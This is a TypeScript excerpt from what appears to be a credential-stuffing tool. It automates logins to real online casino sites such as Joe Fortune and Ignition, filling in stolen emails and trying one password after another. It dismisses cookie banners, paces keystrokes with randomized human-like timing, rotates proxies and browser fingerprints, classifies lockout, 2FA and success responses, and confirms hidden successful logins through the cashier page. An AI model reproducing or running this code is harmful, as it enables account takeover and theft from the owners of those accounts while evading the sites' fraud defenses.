              for (const sel of cssSelectors) {
                try {
                  const el = document.querySelector(sel);
                  if (el && isVis(el)) {
                    const txt = (el.textContent || '').trim().toLowerCase();
                    const looksLikeConsent = txt.includes('accept') || txt.includes('agree') ||
                      txt.includes('allow') || txt.includes('ok') || txt.includes('got it') ||
                      txt.includes('close') || txt.includes('dismiss') || txt.includes('continue');
                    if (looksLikeConsent || sel.startsWith('#')) {
                      el.click();
                      window.__cookieBannerDismissed = true;
                      return true;
                    }
                  }
                } catch { /* intentional */ }
              }

              // Strategy C: Click any visible close/X button in a cookie-like container
              const containers = document.querySelectorAll(
                '[class*="cookie"], [class*="Cookie"], [class*="consent"], [class*="Consent"], ' +
                '[class*="banner"], [class*="Banner"], [class*="overlay"], [class*="Overlay"], ' +
                '[class*="modal"], [class*="Modal"], [class*="popup"], [class*="Popup"], ' +
                '[class*="notice"], [class*="Notice"], [class*="gdpr"], [class*="GDPR"]'
              );
              for (const container of containers) {
                const closeBtn = container.querySelector(
                  'button[class*="close"], button[class*="Close"], ' +
                  'button[aria-label*="close" i], button[aria-label*="dismiss" i], ' +
                  '[class*="close-btn"], [class*="closeBtn"], .close, .dismiss'
                );
                if (closeBtn && isVis(closeBtn)) {
                  try { closeBtn.click(); window.__cookieBannerDismissed = true; return true; } catch { /* intentional */ }
                }
              }

              // Strategy D: Force CSS override on known CookieInformation overlay
              try {
                const coiOverlay = document.getElementById('coiOverlay');
                if (coiOverlay) {
                  coiOverlay.style.setProperty('display', 'none', 'important');
                  window.__cookieBannerDismissed = true;
                  return true;
                }
              } catch { /* intentional */ }

              return false;
            };

            // ── Phase 4: Fire immediately ──
            if (tryDismiss()) return;

            // ── Phase 5: Install MutationObserver for late-appearing banners ──
            if (!window.__cookieMutObs) {
              const obs = new MutationObserver(() => {
                if (tryDismiss()) {
                  obs.disconnect();
                  window.__cookieMutObs = null;
                }
              });
              if (document.body) {
                obs.observe(document.body, { childList: true, subtree: true });
              } else {
                document.addEventListener('DOMContentLoaded', () => {
                  obs.observe(document.body, { childList: true, subtree: true });
                });
              }
              window.__cookieMutObs = obs;
              // Auto-disconnect after 15 seconds to prevent leaking
              setTimeout(() => { try { obs.disconnect(); } catch { /* intentional */ } }, 15000);
            }
          })();
        `).catch(() => { });

        // ── Poll fallback: catch banners the observer might miss ──
        // Polls every 500ms for up to 5 seconds. Short-circuits if already dismissed.
        for (let i = 0; i < 10; i++) {
          await this.pace(Math.round(gaussianClamped(375, 100, 200, 600)));
          const dismissed = await sp.evaluate(`window.__cookieBannerDismissed === true`).catch(() => false);
          if (dismissed) {
            this.log("INFO", `  ${site.name}: 🍪 Cookie banner dismissed (poll round ${i + 1})`);
            break;
          }
          // Re-fire tryDismiss in case MutationObserver missed it
          if (i === 4) {
            await sp.evaluate(`
              (() => {
                if (window.__cookieBannerDismissed) return;
                const btns = document.querySelectorAll('button, a, [role="button"]');
                const targets = ['accept all', 'accept cookies', 'agree', 'allow all'];
                for (const phrase of targets) {
                  for (const el of btns) {
                    const txt = (el.textContent || '').trim().toLowerCase();
                    if (txt === phrase || txt.startsWith(phrase)) {
                      const r = el.getBoundingClientRect();
                      if (r.width > 0 && r.height > 0) { el.click(); window.__cookieBannerDismissed = true; return; }
                    }
                  }
                }
              })();
            `).catch(() => { });
          }
        }
      }

      // ── Wait for and fill username ──
      await sp.waitForSelector(site.selectors.username, 8000).catch(() => { });
      const usernameFilled = await this.spiderCloudFill(sp, site.selectors.username, cred.email);
      if (!usernameFilled) {
        this.log("WARN", `  ${site.name}: username fill failed after all passes — aborting flow`);
        return { outcome: "N/A", attempts: 0, reason: "username-fill-failed" };
      }
      this.log("INFO", `  ${site.name}: filled username (verified)`);
      await this.pace(Math.round(gaussianClamped(350, 120, 150, 600)));

      // ── Password attempt loop ──
      let attempts = 0;
      for (const password of passwords) {
        attempts++;
        this.log("INFO", `  ${site.name}: attempt ${attempts}/${passwords.length}`);

        // Clear and fill password (with verify-and-retry)
        await sp.clear(site.selectors.password).catch(() => { });
        const pwFilled = await this.spiderCloudFill(sp, site.selectors.password, password);
        if (!pwFilled) {
          this.log("WARN", `  ${site.name}: password fill failed — skipping this submit`);
          continue;
        }
        await this.pace(Math.round(gaussianClamped(250, 80, 120, 450)));

        const snapCtx = { email: cred.email, target: handle.proxyUsed };
        await this.captureSpidernewScreenshot(sp, `${site.name}:attempt-${attempts}-${password}`, snapCtx);

        // ── SUBMIT STRATEGY: PASSWORD MANAGER MIMICRY (PRIMARY) ─────────────────
        // Primary: Try Enter key in password field (like password manager)
        // Backup: Triple click on submit button
        this.log("INFO", `  ${site.name}: submitting credentials (password manager mimicry)...`);

        // PRIMARY METHOD: Press Enter in password field (autofill style)
        await sp.evaluate(`
          const pwField = document.querySelector('${site.selectors.password}');
          if (pwField) {
            pwField.focus();
            const enterEvent = new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true });
            pwField.dispatchEvent(enterEvent);
          }
        `).catch(() => {});

        await this.pace(Math.round(gaussianClamped(500, 100, 300, 800)));

        // Check if submit worked (URL change or navigation)
        // If not, use triple click backup
        const submitWorked = await sp.evaluate(`
          window.__submitWorked = window.__submitWorked || false;
          window.__submitWorked;
        `).catch(() => false);

        if (!submitWorked) {
          // BACKUP METHOD: Triple click using JavaScript evaluation
          this.log("INFO", `  ${site.name}: Primary submit failed, using triple click backup...`);
          await sp.evaluate(`
            const btn = document.querySelector('${site.selectors.submit}');
            if (btn) {
              // Triple click with slight position variations
              const rect = btn.getBoundingClientRect();
              const positions = [
                { x: rect.left + rect.width * 0.4, y: rect.top + rect.height * 0.5 },
                { x: rect.left + rect.width * 0.5, y: rect.top + rect.height * 0.45 },
                { x: rect.left + rect.width * 0.6, y: rect.top + rect.height * 0.55 }
              ];

              positions.forEach(pos => {
                const clickEvent = new MouseEvent('click', {
                  bubbles: true, cancelable: true, clientX: pos.x, clientY: pos.y
                });
                btn.dispatchEvent(clickEvent);
              });
            }
          `).catch(() => {});
        }

        // Wait for response — navigation or DOM change
        await sp.waitForNavigation(8000).catch(() => { });
        await this.pace(Math.round(gaussianClamped(2000, 500, 1200, 3000)));

        await this.captureSpidernewScreenshot(sp, `${site.name}:attempt-${attempts}-stable`, snapCtx);

        // ── Gather signals for outcome classification ──
        let bodyText = "";
        let passwordPresent = true;
        let urlMoved = false;
        let hasSuccessSelector = false;
        let submitGone = false;
        let alertPresent = false;

        try {
          const bodyTextRaw = await sp.evaluate(SHADOW_DOM_TEXT_EXTRACTOR).catch(() => "");
          const signalsRaw = await sp.evaluate(`
            (() => {
              const body = ${JSON.stringify(bodyTextRaw)};
              const pw = !!document.querySelector('${site.selectors.password.replace(/'/g, "\\\\'")}');
              const currentPath = location.pathname + location.search;
              const loginPath = new URL('${site.url}').pathname;
              const moved = currentPath !== loginPath;
              const success = !!document.querySelector('.my-account, .account-balance, .dashboard, .lobby, [class*="balance"], [data-testid="balance"]');
              const submitEl = document.querySelector('${site.selectors.submit.replace(/'/g, "\\\\'")}');
              const gone = !submitEl;
              const alert = !!document.querySelector('.ol-alert__content, .alert-danger, .error-message, [class*="error"], [role="alert"]');
              return JSON.stringify({ body, pw, moved, success, gone, alert });
            })();
          `);

          const signals = JSON.parse(signalsRaw as string);
          bodyText = signals.body || "";
          passwordPresent = signals.pw;
          urlMoved = signals.moved;
          hasSuccessSelector = signals.success;
          submitGone = signals.gone;
          alertPresent = signals.alert;
        } catch (evalErr: unknown) {
          this.log("WARN", `  ${site.name}: signal extraction failed: ${evalErr instanceof Error ? evalErr.message : String(evalErr)}`);
          // Fallback: try to get content as text
          try {
            bodyText = (await sp.evaluate(SHADOW_DOM_TEXT_EXTRACTOR) as string) || "";
          } catch { bodyText = ""; }
        }

        const loginSignals: LoginSignals = {
          bodyText,
          passwordPresent,
          urlMoved,
          hasSuccessSelector,
          submitGone,
          alertPresent,
        };

        const verdict = classifyLoginResponse(loginSignals, site.name);
        this.log("INFO", `  ${site.name}: verdict=${verdict} (pw=${passwordPresent}, urlMoved=${urlMoved}, submitGone=${submitGone}, alert=${alertPresent})`);

        // ── Map verdict to outcome ──
        switch (verdict) {
          case "success":
          case "verify-phone":
            await this.captureSpidernewScreenshot(sp, `${site.name}:success`, snapCtx);
            return { outcome: "inconclusive", attempts, reason: "spider-cloud-missing-unified-accepted-submit-evidence" };
          case "authenticator":
            await this.captureSpidernewScreenshot(sp, `${site.name}:authenticator-attempt-${attempts}`, snapCtx);
            return { outcome: "inconclusive", attempts, reason: "spider-cloud-missing-unified-accepted-submit-evidence" };
          case "pin-misdirection":
            return {
              outcome: "N/A",
              attempts,
              reason: "misdirection",
              misdirection: { url: site.url, trigger: "pin-update" },
              requeueCredential: true,
            };
          case "ignition-verification":
            return {
              outcome: "N/A",
              attempts,
              reason: "misdirection",
              misdirection: { url: site.url, trigger: "login-verification" },
              requeueCredential: true,
            };
          case "cashier-bounce":
            return {
              outcome: "N/A",
              attempts,
              reason: "cashier-bounce-human-review",
            };
          case "disabled":
            return { outcome: "inconclusive", attempts, reason: "spider-cloud-missing-unified-accepted-submit-evidence" };
          case "tempdisabled":
            return { outcome: "inconclusive", attempts, reason: "spider-cloud-missing-unified-accepted-submit-evidence" };
          case "incorrect":
            // Continue to next password
            this.log("INFO", `  ${site.name}: incorrect — trying next password`);
            // Re-navigate if the page lost the login form
            if (!passwordPresent) {
              await spiderBrowser.goto(site.url).catch(() => { });
              await sp.waitForReady(8000).catch(() => { });
              await sp.waitForSelector(site.selectors.username, 5000).catch(() => { });
              await this.spiderCloudFill(sp, site.selectors.username, cred.email);
              await this.pace(Math.round(gaussianClamped(300, 100, 150, 500)));
            }
            continue;
          case "timeout":
          case "other":
          default:
            // For the last password, report noaccount; otherwise try next
            if (attempts >= passwords.length) {
              return { outcome: "inconclusive", attempts, reason: "spider-cloud-missing-unified-accepted-submit-evidence" };
            }
            // Re-navigate for next attempt if form is gone
            if (!passwordPresent) {
              await spiderBrowser.goto(site.url).catch(() => { });
              await sp.waitForReady(8000).catch(() => { });
              await sp.waitForSelector(site.selectors.username, 5000).catch(() => { });
              await this.spiderCloudFill(sp, site.selectors.username, cred.email);
              await this.pace(Math.round(gaussianClamped(300, 100, 150, 500)));
            }
            continue;
        }
      }

      // All passwords exhausted
      return { outcome: "inconclusive", attempts, reason: "spider-cloud-missing-unified-accepted-submit-evidence" };

    } catch (e: unknown) {
      this.log("WARN", `  ${site.name}: spider-cloud exception: ${e instanceof Error ? e.message : String(e)}`);
      return { outcome: "N/A", attempts: 0, reason: `exception: ${e instanceof Error ? e.message : String(e)}` };
    }
  }

  /**
   * Execute the full login flow for a single site with smart password retry.
   * Returns the final outcome and attempt count for this site.
   *
   * `proxyKey` is the unique sticky-session identifier (server#username)
   * threaded through so misdirection burns can quarantine exactly the
   * sticky session that was flagged without poisoning siblings sharing the
   * gateway host:port. Pass undefined for backends without a proxy.
   */

  private async executeLoginFlow(
    page: Page,
    site: SiteConfig,
    cred: Credential,
    batchIndex: number = 0,
    postLoadDelaySeconds: number = 0,
    proxyKey?: string,
    effectiveBackend?: string,
    isSessionReused: boolean = false
  ): Promise<LoginFlowResult> {
    // ── Network response trap: scan response bodies for the per-credential
    // verdict phrases only. The four source-of-truth screen triggers
    // (AUTHENTICATOR / VERIFY YOUR PHONE / +61 / UPDATE YOUR PIN / LOGIN VERIFICATION)
    // are intentionally NOT checked here — HTTP response bodies routinely
    // include the full page chrome (header / footer with customer-support
    // "+61" numbers, marketing copy, meta tags) which would otherwise
    // fire a false-positive verdict before the credential has even been
    // submitted. Those triggers are detected exclusively via the DOM
    // evalResponse + MutationObserver, both of which are phase-gated on
    // the login form having actually changed state.
    let networkDetection: LoginResponse | null = null;
    // Higher number = stronger signal that should never be downgraded by a
    // later response carrying a weaker one. With naive last-write-wins, a
    // benign trailing response body containing "incorrect" (e.g., a help-
    // article fragment loaded after the auth call) could overwrite an
    // earlier authoritative "been disabled" signal and burn the credential
    // with the wrong verdict. The priority order below mirrors the
    // terminal-ness of each outcome: disabled (permanent) > tempdisabled
    // (cooldown) > incorrect (retryable).
    // Blueprint ACT III Phase 1: Universal Classification Engine
    // Priority ladder: higher number = stronger signal, never downgraded.
    const NETWORK_PRIORITY: Partial<Record<NonNullable<LoginResponse>, number>> = {
      "disabled": 30,
      "authenticator": 25,
      "tempdisabled": 20,
      "success": 15,
      "incorrect": 10,
      "other": 5,
    };
    const setNetwork = (candidate: NonNullable<LoginResponse>): void => {
      if (!networkDetection) { networkDetection = candidate; return; }
      const cur = NETWORK_PRIORITY[networkDetection] ?? 0;
      const next = NETWORK_PRIORITY[candidate] ?? 0;
      if (next > cur) networkDetection = candidate;
    };
    const responseHandler = async (response: any) => {
      try {
        const req = response.request();
        if (req.method().toUpperCase() !== "POST") return;
        const url = req.url().toLowerCase();
        if (!url.includes('login') && !url.includes('auth') && !url.includes('token') && !url.includes('oauth') && !url.includes('session')) return;

        const status = response.status();
        const ct = (response.headers()["content-type"] || "").toLowerCase();

        const recordNetwork = (outcome: NonNullable<LoginResponse>) => {
          setNetwork(outcome);
          flowTracer.recordEvent({
            type: "network",
            session_id: (page as any).__sessionId ?? "unknown",
            email: cred.email,
            site: site.name,
            message: `Detected network outcome: ${outcome} (HTTP ${status})`
          });
        };

        // Read body (first 1200 chars per blueprint) if readable content-type
        let body = "";
        if (ct.includes("text") || ct.includes("json") || ct.includes("html")) {
          body = (await response.text()).substring(0, 1200);
        }
        const lower = body.toLowerCase();

        // ── Body phrase checks (highest priority — override status codes) ──

        // 1. HTML response on 403 → blocked (WAF trap)
        if (body.trimStart().startsWith('<') && status === 403) { recordNetwork("other"); return; }

        // 5. temporarily / locked / blocked / too many → temporarily_disabled
        if (lower.includes("temporarily") || lower.includes("locked") ||
          lower.includes("blocked") || lower.includes("too many")) { recordNetwork("tempdisabled"); return; }

        // 6. permanently / been disabled → permanently_disabled
        if (lower.includes("permanently") || lower.includes("been disabled")) { recordNetwork("disabled"); return; }

        // 4. Status 428 or body contains mfa_required → 2FA
        if (status === 428 || lower.includes("mfa_required")) { recordNetwork("authenticator"); return; }

        // 7. not found / no account → noaccount (mapped to incorrect for retry)
        if (lower.includes("not found") || lower.includes("no account")) { recordNetwork("incorrect"); return; }

        // 8. captcha → crash (silent captcha enforcement)
        if (lower.includes("captcha")) { recordNetwork("other"); return; }

        // Existing: incorrect phrase
        if (lower.includes("incorrect")) { recordNetwork("incorrect"); return; }

        // ── Status code fallbacks (only fire when no body phrase matched) ──
        if (status === 0 || status >= 500) { recordNetwork("other"); return; }
        if (status === 200 || status === 201) { recordNetwork("success"); return; }

        // 9. Fallback → incorrect
        recordNetwork("incorrect");
      } catch { /* non-text response — ignore */ }
    };
    // NOTE: `page.on("response", responseHandler)` is registered INSIDE the
    // try/finally at the bottom of this method so a throw during the
    // MutationObserver / show-password init-script setup below can't leave
    // the handler attached to the page — which previously caused responses
    // from the NEXT site (same session, same tab) to clobber networkDetection.
    page.on("dialog", async (dialog) => {
      this.log("INFO", `  💬 Auto-accepting dialog: [${dialog.type()}] ${dialog.message()}`);
      await dialog.accept().catch(() => { });
    });

    // ── Shadow-DOM-aware MutationObserver: install once per page, runs on every doc ──
    // All trigger words are sourced from `login-flow.ts` so this observer and
    // the post-load classifier can never drift.
    const loginPathname = (() => {
      try { return new URL(site.url).pathname.toLowerCase(); } catch { return ""; }
    })();
    await installLoginTriggerObserver(page, {
      successSelector: SUCCESS_SELECTOR,
      passwordSelector: site.selectors.password || "",
      loginPath: loginPathname,
      siteName: site.name,
    });

    // Apex Enhancement #5: Inject Zero-Sleep DOM Classifier for dual-system
    await injectDualClassifier(page, site.name);

    if (!(page as any).__casinoObserverInstalled) {
      (page as any).__casinoObserverInstalled = true;
    }

    // ── Cookie consent coordinate calibration ────────────────────────────
    // Joe/Ignition now store a normalized "Accept All" click target inside
    // the page and the driver later performs viewport-scaled coordinate
    // clicks with slight Gaussian variance. This replaces selector-union
    // dismissal so the click path matches the locked flow spec.
    if (!(page as any).__cookieCoordinateCalibrationInstalled) {
      const acceptPhrases = ["accept all", "allow all", "accept cookies"];
      await page.addInitScript(({ phrases, loginPath }: { phrases: string[]; loginPath: string }) => {
        if ((window as any).__cookieCoordinateCalibrationActive) return;
        (window as any).__cookieCoordinateCalibrationActive = true;
        const isVisible = (el: HTMLElement): boolean => {
          try {
            const rect = el.getBoundingClientRect();
            if (rect.width <= 0 || rect.height <= 0) return false;
            const style = (el.ownerDocument?.defaultView || window).getComputedStyle(el);
            if (style.display === "none" || style.visibility === "hidden") return false;
            if (parseFloat(style.opacity || "1") < 0.05) return false;
            return true;
          } catch { return false; }
        };
        const cookieOverlayVisible = (): boolean => {
          try {
            const nodes = Array.from(document.querySelectorAll(
              '[id*="cookie" i],[class*="cookie" i],[id*="consent" i],[class*="consent" i],[id*="gdpr" i],[class*="gdpr" i]'
            ));
            return nodes.some((node) => isVisible(node as HTMLElement));
          } catch {
            return false;
          }
        };
        const storeCalibration = () => {
          if (!document.body) return;
          const currentPath = (location.pathname || "").toLowerCase();
          if (loginPath && currentPath !== loginPath) {
            (window as any).__cookieDismissed = true;
            return;
          }
          let best: any = null;
          const candidates = Array.from(document.querySelectorAll('button, a, [role="button"]'));
          for (const node of candidates) {
            if (!isVisible(node as HTMLElement)) continue;
            const text = (node.textContent || "").trim().toLowerCase();
            if (!text) continue;
            const phraseIndex = phrases.findIndex((phrase) => text.includes(phrase));
            if (phraseIndex === -1) continue;
            const rect = node.getBoundingClientRect();
            const centerX = rect.left + rect.width / 2;
            const centerY = rect.top + rect.height / 2;
            const score = (phrases.length - phraseIndex) * 10_000 + rect.width * rect.height;
            if (!best || score > best.score) {
              best = {
                score,
                phrase: phrases[phraseIndex],
                text,
                originalX: Math.round(centerX),
                originalY: Math.round(centerY),
                viewportWidth: Math.max(window.innerWidth, 1),
                viewportHeight: Math.max(window.innerHeight, 1),
                normalizedX: centerX / Math.max(window.innerWidth, 1),
                normalizedY: centerY / Math.max(window.innerHeight, 1),
              };
            }
          }
          if (best) {
            (window as any).__cookieAcceptCalibration = best;
            (window as any).__cookieDismissed = false;
          } else if (!cookieOverlayVisible()) {
            (window as any).__cookieDismissed = true;
          }
        };
        const install = () => {
          if (!document.body) { requestAnimationFrame(install); return; }
          storeCalibration();
          const observer = new MutationObserver(() => storeCalibration());
          observer.observe(document.body, { childList: true, subtree: true, attributes: true, characterData: true });
          window.addEventListener("resize", storeCalibration, { passive: true });
        };
        install();
      }, { phrases: acceptPhrases, loginPath: loginPathname });
      (page as any).__cookieCoordinateCalibrationInstalled = true;
    }

    // ── Show-password auto-click observer ────────────────────────────────
    // Clicks the password-reveal toggle the instant it mounts so the
    // password is rendered in plain text. Useful for visual verification
    // during live tests and for sites whose verification flow checks the
    // visible input.value rather than the masked one. Gated on the presence
    // of a type="password" input so we never click toggles on unrelated
    // pages, and capped at one click per page to avoid re-hiding.
    if (!(page as any).__showPasswordAutoClickInstalled) {
      const showPwSelectors = [
        // Joe Fortune calibrated — simplified from the full XPath, preserves
        // the distinguishing class which uniquely identifies the reveal span.
        'div.ol-inputLeftIconRecipe__rightContent--icon_after > span',
        // Ignition calibrated — same simplification pattern as joe.
        'div.ol-text__rightContent--icon_after > span',
        // Generic accessibility attributes
        '[aria-label*="show password" i]',
        '[aria-label*="reveal password" i]',
        '[aria-label*="toggle password" i]',
        '[data-testid*="show-password" i]',
        '[data-testid*="toggle-password" i]',
        // Common BEM / utility class conventions
        'button.show-password',
        'button.toggle-password',
        '.password-toggle',
        '.show-password',
      ];
      await page.addInitScript(({ cssSels }: { cssSels: string[] }) => {
        if ((window as any).__showPasswordAutoClickActive) return;
        (window as any).__showPasswordAutoClickActive = true;
        let alreadyClicked = false;
        const isVisible = (el: HTMLElement): boolean => {
          try {
            const rect = el.getBoundingClientRect();
            if (rect.width <= 0 || rect.height <= 0) return false;
            const style = (el.ownerDocument?.defaultView || window).getComputedStyle(el);
            if (style.display === 'none' || style.visibility === 'hidden') return false;
            if (parseFloat(style.opacity || '1') === 0) return false;
            return true;
          } catch { return false; }
        };
        const tryClickIn = (root: Document | ShadowRoot): boolean => {
          if (alreadyClicked) return false;
          // Only click if there's still a masked password input — once the
          // input is type="text" the toggle has already been activated.
          const pwInput = root.querySelector('input[type="password"]');
          if (!pwInput) return false;
          for (const sel of cssSels) {
            try {
              const el = root.querySelector(sel);
              if (el && isVisible(el as HTMLElement)) {
                (el as HTMLElement).click();
                alreadyClicked = true;
                return true;
              }
            } catch { /* invalid selector — skip */ }
          }
          return false;
        };
        const tryClick = (): boolean => {
          if (!document.body || alreadyClicked) return false;
          if (tryClickIn(document)) return true;
          const iframes = Array.from(document.querySelectorAll('iframe'));
          for (const iframe of iframes) {
            try {
              const doc = (iframe).contentDocument;
              if (doc && tryClickIn(doc)) return true;
            } catch { /* cross-origin — skip */ }
          }
          try {
            const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_ELEMENT);
            let node: any = walker.nextNode();
            while (node) {
              if (node.shadowRoot && tryClickIn(node.shadowRoot)) return true;
              node = walker.nextNode();
            }
          } catch { /* walker failed */ }
          return false;
        };
        const install = () => {
          if (!document.body) { requestAnimationFrame(install); return; }
          if (tryClick()) return;
          const observer = new MutationObserver(() => {
            if (tryClick()) {
              observer.disconnect();
              (window as any).__showPasswordAutoClickActive = false;
            }
          });
          observer.observe(document.body, { childList: true, subtree: true });
        };
        install();
      }, { cssSels: showPwSelectors });
      (page as any).__showPasswordAutoClickInstalled = true;
    }

    page.on("response", responseHandler);
    let stopBackgroundClicks: (() => void) | undefined;
    try {
      // Rule 11 (background right-click noise) REMOVED — detection signal, not camouflage
      const result = await this.executeLoginFlowInner(page, site, cred, batchIndex, postLoadDelaySeconds, () => networkDetection, () => { networkDetection = null; }, proxyKey, (this as any)._ignitionVerifBypass, effectiveBackend, isSessionReused);
      // Final cashier verification step for ambiguous or hidden successful logins.
      // This runs after all attempts are finished (whether successful or not)
      // but before the final outcome is returned to the engine.
      // Skip cashier verification for "skipped" outcomes — no attempt was
      // ever made, so the session was never authenticated and the cashier
      // will always bounce. Wasting a navigation round-trip on it is pure
      // overhead. Only "success" (sanity-check) and "noaccount" (potential
      // hidden-success upgrade) trigger the verification.
      // `bypassCashierVerification` short-circuits the cashier nav for
      // terminal-success outcomes that live on a pre-cashier screen — namely
      // VERIFY YOUR PHONE / +61, where the user is in a real success state
      // but the cashier reachability check would bounce back to login and
      // produce a misleading "unconfirmed" capture even though the
      // outcome is a real success. See
      // `shouldRunCashierVerification` for the full predicate.
      const alreadyVerifiedSite = (page as any).__cashierVerifiedSuccessSite as string | undefined;
      if (shouldRunCashierVerification(result, site.name, alreadyVerifiedSite)) {
        const verified = await this.performCashierVerification(page, site, cred);
        if (verified === "success" && result.outcome === "noaccount") {
          this.log("INFO", `  ⬆ ${site.name}: cashier verification upgraded outcome noaccount → success`);
          result.outcome = "success";
        } else if (!verified && result.outcome === "success") {
          // Blueprint: cashier bounce disproves the success — downgrade
          this.log("WARN", `  ⬇ ${site.name}: cashier verification bounced — downgrading success → soft_success_failed_cashier`);
          result.outcome = "soft_success_failed_cashier";
        }
      }

      if (result.outcome === "success") {
        try {
          const engine = getRotationEngine();
          const rotatedProfile = engine.buildRotatedProfile(cred.email, proxyKey);
          const blender = getBlender();
          blender.recordSuccess({
            email: cred.email,
            timestamp: new Date().toISOString(),
            ua: rotatedProfile.ua,
            hardware: rotatedProfile.hardware,
            geo: rotatedProfile.geo,
            seed: rotatedProfile.seed,
            backend: effectiveBackend || this.config?.backend || "unknown",
            outcome: "success"
          });
        } catch (err: any) {
          this.log("WARN", `  ⚠ Failed to record blender success: ${err.message}`);
        }
      }

      // Finalize flow screenshot session with the outcome
      if (this._flowScreenshotter.isActive) {
        // Capture one final screenshot of the terminal state
        if (!page.isClosed()) {
          await this._flowScreenshotter.capture(page, `outcome-${result.outcome}`).catch(() => { });
        }
        this._flowScreenshotter.finalize(result.outcome);
      }

      // Apex Enhancement #10: Record session telemetry
      try {
        const matrix = await page.evaluate(() => (window as any).__automatiTimelineMatrix || {}).catch(() => ({}));
        const start = await page.evaluate(() => (window as any).__automatiTimelineStart || 0).catch(() => 0);
        const flowTime = start > 0 ? Date.now() - start : 0;
        recordSession({
          session_id: (page as any).__sessionId || "unknown",
          email: cred.email,
          target_site: site.name,
          backend: effectiveBackend || this.config?.backend || "unknown",
          proxy_key: proxyKey || "unknown",
          proxy_region: this.config?.proxyCountry || "unknown",
          fingerprint_seed: (page as any).__fingerprintSeed ?? null,
          ua_hash: "unknown",
          timing_vector: {
            pre_fill_ms: matrix['input[type="text"]'] || 0,
            keystroke_cadence_ms: 0,
            post_submit_wait_ms: 0,
            cookie_dismiss_ms: 0,
            total_flow_ms: flowTime,
          },
          network_metrics: {
            ttfb_ms: 0,
            resource_count: 0,
            response_size_bytes: 0,
            challenge_headers_detected: false,
            status_code: 0,
          },
          dom_metrics: {
            transition_count: Object.keys(matrix).length,
            classification_latency_ms: 0,
            mutation_events: 0,
            classifier_source: "legacy_poll",
          },
          hermes_interventions: 0,
          outcome: result.outcome,
          block_rate_at_time: 0,
          attempt_index: result.attempts,
        });
      } catch (e) {
        this.log("WARN", `Telemetry record failed: ${String(e)}`);
      }

      return result;
    } finally {
      // Ensure flow screenshotter is finalized even on exceptions
      if (this._flowScreenshotter.isActive) {
        this._flowScreenshotter.finalize("exception");
      }
      if (stopBackgroundClicks) {
        try {
          stopBackgroundClicks();
        } catch (e) {
          this.log("WARN", `Error stopping background clicks: ${e instanceof Error ? e.message : String(e)}`);
        }
      }
      page.off("response", responseHandler);
    }
  }

  /**
   * Final verification step for Joe Fortune and Ignition: navigate to the cashier
   * page to confirm if the session is actually authenticated. This catches
   * "hidden" successes where the login form returned an ambiguous error or
   * failed to redirect, but the session was established in the background.
   */
  private async performCashierVerification(page: Page, site: SiteConfig, cred?: Credential): Promise<Outcome | undefined> {
    if (!site.verifyUrl) return undefined;

    // Pin to row context so late-tail SNAPs (this verification can fire
    // after the next row has begun and rotated this.currentEmail) carry
    // the originating row's email, not the next row's.
    const snapCtx = { email: cred?.email, target: site.name };

    this.log("INFO", `  🔍 Verifying ambiguous/hidden login state via ${site.name} cashier...`);

    // Early-bounce detector. Catches both HTTP-level (302 → /login) AND
    // JS-level (window.location after page load) bounce-back-to-login
    // redirects without waiting for networkidle. The moment the main frame
    // lands on a login URL with a destination=/redirect= query arg, we
    // resolve the bounce promise and short-circuit the verification.
    const bouncePattern = /\/(login|signin|sign-in)(\?|$|\/)/;
    const bounceParamPattern = /[?&](destination|redirect|return(to|_to|url)?)=/;
    let bounceUrl: string | null = null;
    let onBounceResolve: ((url: string) => void) | null = null;
    const bouncePromise = new Promise<string>((res) => { onBounceResolve = res; });
    const bounceListener = (frame: any) => {
      if (frame !== page.mainFrame()) return;
      const u = frame.url();
      const lower = u.toLowerCase();
      if (bouncePattern.test(lower) && bounceParamPattern.test(lower)) {
        if (!bounceUrl) { bounceUrl = u; onBounceResolve?.(u); }
      }
    };
    page.on("framenavigated", bounceListener);

    try {
      // Race the cashier goto + a brief settle against the bounce listener.
      // Whichever resolves first wins. The 12 s ceiling is the combined
      // upper bound of (goto domcontentloaded) + (short networkidle) — the
      // OLD code waited up to ~26 s here. We also wrap `bouncePromise` in
      // its own timeout so a stuck bounce listener (frame navigation event
      // that fires but never matches the bouncePattern, or a page that hangs
      // before any framenavigated fires) can't keep this race alive forever.
      const BOUNCE_LISTENER_TIMEOUT_MS = 18_000;
      let bounceTimeoutTimer: NodeJS.Timeout;
      const settledOrBounced = await Promise.race([
        bouncePromise.then((u) => ({ kind: "bounced" as const, url: u })),
        (async () => {
          await page.goto(site.verifyUrl!, { waitUntil: "networkidle", timeout: 12000 }).catch(() => { });
          await page.waitForLoadState("networkidle", { timeout: 6000 }).catch(() => { });
          return { kind: "settled" as const };
        })(),
        new Promise<{ kind: "bounce-timeout" }>((resolve) => {
          bounceTimeoutTimer = setTimeout(() => resolve({ kind: "bounce-timeout" }), BOUNCE_LISTENER_TIMEOUT_MS);
          bounceTimeoutTimer.unref?.();
        }),
      ]).finally(() => { if (bounceTimeoutTimer) clearTimeout(bounceTimeoutTimer); });
      if (settledOrBounced.kind === "bounce-timeout") {
        this.log("WARN", `  ${site.name}: cashier verification timed out after ${BOUNCE_LISTENER_TIMEOUT_MS / 1000}s — bounce listener stuck`);
        return undefined;
      }

      if (settledOrBounced.kind === "bounced") {
        this.log("WARN", `  ${site.name}: cashier bounced to login (${settledOrBounced.url.substring(0, 90)}) — no verification override`);
        await this.captureScreenshot(page, `${site.name}:verification-cashier-bounced`, snapCtx);
        return undefined;
      }

      // Cashier reached settle without bouncing. Final URL check — late-fire
      // JS redirects that race in AFTER networkidle still get caught here.
      const cur = page.url();
      const lower = cur.toLowerCase();
      if (bouncePattern.test(lower) && bounceParamPattern.test(lower)) {
        this.log("WARN", `  ${site.name}: cashier bounced to login (${cur.substring(0, 90)}) — no verification override`);
        await this.captureScreenshot(page, `${site.name}:verification-cashier-bounced`, snapCtx);
        return undefined;
      }

      // Final URL check — must happen BEFORE the audit screenshot so the
      // verdict label on the capture (success-confirmed-at-cashier vs
      // verification-cashier-unconfirmed) accurately reflects what the snap
      // is documenting.
      let verified: Outcome | undefined = undefined;
      try {
        if (this.isUrlChangedAwayFromLogin(site.verifyUrl, page.url())) {
          this.log("INFO", `  ✅ ${site.name}: cashier reachable — confirming success`);
          verified = "success";
          (page as any).__cashierVerifiedSuccessSite = site.name;
        } else {
          this.log("WARN", `  ${site.name}: cashier load bounced back to login — no verification override`);
        }
      } catch { /* page closed mid-check — no override */ }

      // Synchronized success capture: only fire AFTER the cashier navigation
